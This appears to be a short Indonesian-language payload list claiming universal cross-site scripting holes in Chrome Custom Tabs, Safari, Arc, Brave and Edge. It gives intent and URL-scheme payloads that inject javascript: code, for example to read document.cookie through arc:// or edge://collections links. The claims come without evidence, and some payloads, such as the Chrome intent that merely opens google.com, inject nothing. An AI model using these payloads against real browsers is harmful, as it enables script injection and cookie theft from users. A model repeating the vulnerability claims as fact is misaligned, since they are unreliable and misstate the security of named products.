🌐 CHROME CUSTOM TAB uXSS
💀 Analog dengan Samsung Browser export activity
Chrome Custom Tabs memiliki intent filters yang bisa dieksploitasi. Mirip dengan Bixby → SBrowserMainActivity flow. 
// Chrome Custom Tab Intent
intent://google.com#Intent;
scheme=https;
package=com.android.chrome;
end
🍎 SAFARI URL SCHEME uXSS
💀 Safari URL Scheme Handler Vulnerability
Safari memiliki URL handlers untuk x-apple-extension:// dan x-web-search:// Injection di sini bisa menyebabkan UXSS. 
// Safari URL scheme
x-apple-extension://com.apple.Safari/extension?url=javascript:alert(origin)
x-web-search://?query=javascript:alert(origin)
🌀 ARC BROWSER DEEP LINK uXSS
💀 ARC Browser Deep Link Vulnerability
ARC memiliki arc:// dan arc-deeplink:// handlers. Eksploitasi mirip dengan Bixby Launcher di Samsung. 
// ARC deep link
arc://newtab?url=javascript:alert(document.cookie)
arc-deeplink://open?url=javascript:alert(origin)
🦁 BRAVE REWARDS uXSS
💀 Brave Rewards Intent Exploitation
Brave memiliki brave://rewards dan intent filters untuk Rewards. Injection bisa mengeksekusi script di Brave internal pages. 
// Brave Rewards intent
brave://rewards?url=javascript:alert(chrome)
intent://rewards#Intent;scheme=brave;end
📚 EDGE COLLECTIONS uXSS
💀 Edge Collections URL Handler
Edge memiliki edge://collections dan microsoft-edge: handlers. Mirip dengan exported activity di Samsung Browser. 
// Edge collections
microsoft-edge:https://google.com
edge://collections?url=javascript:alert(origin)
